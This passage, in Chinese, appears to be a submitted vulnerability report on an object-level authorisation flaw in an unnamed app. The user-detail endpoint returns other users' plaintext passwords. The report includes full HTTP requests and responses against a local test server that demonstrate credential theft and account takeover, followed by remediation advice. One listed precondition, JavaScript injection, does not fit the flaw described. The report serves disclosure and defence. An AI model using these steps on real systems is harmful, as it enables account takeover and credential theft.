d 的用户详情接口并读取明文口令。\n3. 使用泄露出的受害者邮箱和密码再次登录，验证账户接管成功。\n二、研判分析\n前提条件: \n1. 用户运行XXX应用\n2. 攻击者能够注入或控制渲染进程中的JavaScript代码\n实际可行性评估: \n该漏洞在默认鉴权模型下可稳定复现，利用门槛低，实际可利用性高。\n1. 漏洞原理\n该漏洞的根因是用户读取接口仅验证 JWT 是否存在，没有验证路径参数中的 user_id 是否属于当前登录用户。同时接口响应模型包含 password 字段，导致数据库中的明文密码被直接回传给攻击者。攻击者拿到邮箱和口令后，可继续调用登录接口完成账户接管。\n2. 复现步骤\n1. 使用攻击者账号调用 POST /login 获取 JWT。\n2. 携带攻击者 JWT 请求 GET /users/get/1，读取受害者明文邮箱和密码。\n3. 使用泄露出的受害者凭据再次调用 POST /login，确认可以获得受害者 JWT。\n3. 请求响应截图\n3.1 步骤1 攻击者登录\n请求：\nPOST /login HTTP/1.1\nHost: 127.0.0.1:18001\nUser-Agent: python-requests/2.33.1\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nContent-Length: 64\nContent-Type: application/json\n{\"email\": \"attacker@example.com\", \"password\": \"attackerpass123\"}\n响应：\nHTTP/1.1 200 OK\ndate: Sat, 09 May 2026 10:12:48 GMT\nserver: uvicorn\ncontent-length: 308\ncontent-type: application/json\n{\"access_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlckBleGFtcGxlLmNvbSIsImlhdCI6MTc3ODMyMTU2OSwibmJmIjoxNzc4MzIxNTY5LCJqdGkiOiI0MGZkNWQyOS05MTQzLTRjMjktODFmOC1iZTRiMmEwZjVhZWYiLCJleHAiOjE3Nzg0MDc5NjksInR5cGUiOiJhY2Nlc3MiLCJmcmVzaCI6ZmFsc2V9.R77e9whInzmebWhl2LOG0GD8rQGR25NlRtqSlqa_oUY\"}\n3.2 步骤2 读取受害者用户信息\n请求：\nGET /users/get/1 HTTP/1.1\nHost: 127.0.0.1:18001\nUser-Agent: python-requests/2.33.1\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nAuthorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlckBleGFtcGxlLmNvbSIsImlhdCI6MTc3ODMyMTU2OSwibmJmIjoxNzc4MzIxNTY5LCJqdGkiOiI0MGZkNWQyOS05MTQzLTRjMjktODFmOC1iZTRiMmEwZjVhZWYiLCJleHAiOjE3Nzg0MDc5NjksInR5cGUiOiJhY2Nlc3MiLCJmcmVzaCI6ZmFsc2V9.R77e9whInzmebWhl2LOG0GD8rQGR25NlRtqSlqa_oUY\n​\n​\n响应：\nHTTP/1.1 200 OK\ndate: Sat, 09 May 2026 10:12:48 GMT\nserver: uvicorn\ncontent-length: 189\ncontent-type: application/json\n​\n{\"name\":\"Victim User\",\"email\":\"victim@example.com\",\"password\":\"victimpass123\",\"id\":1,\"organisation_id\":1,\"created_at\":\"2026-05-09T10:12:49.021015\",\"updated_at\":\"2026-05-09T10:12:49.021017\"}\n3.3 步骤3 使用泄露凭据登录受害者账号\n请求：\nPOST /login HTTP/1.1\nHost: 127.0.0.1:18001\nUser-Agent: python-requests/2.33.1\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nContent-Length: 60\nContent-Type: application/json\n{\"email\": \"victim@example.com\", \"password\": \"victimpass123\"}\n响应：\nHTTP/1.1 200 OK\ndate: Sat, 09 May 2026 10:12:48 GMT\nserver: uvicorn\ncontent-length: 306\ncontent-type: application/json\n{\"access_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ2aWN0aW1AZXhhbXBsZS5jb20iLCJpYXQiOjE3NzgzMjE1NjksIm5iZiI6MTc3ODMyMTU2OSwianRpIjoiM2ZiNmJmMWUtOGQ1Mi00OWVmLWJkZjUtOGYwOTNjMDhmMjg0IiwiZXhwIjoxNzc4NDA3OTY5LCJ0eXBlIjoiYWNjZXNzIiwiZnJlc2giOmZhbHNlfQ.C4Tftyjsprq6tdCr7Aee9NTLUK0SSfESLhep6FZKiKA\"}\n4. 验证结果\n- 攻击者成功读取到受害者明文密码。\n- 攻击者成功使用泄露凭据登录受害者账号。\n- 该漏洞真实可利用，且明显超过预期边界。\n三、处置建议\n建议尽快做好排查工作，若存在类似情况，优先移除密码明文回显与明文存储，并尽快为用户对象接口补齐基于当前身份的对象级授权控制。", "submit_user_name": "长亭"}
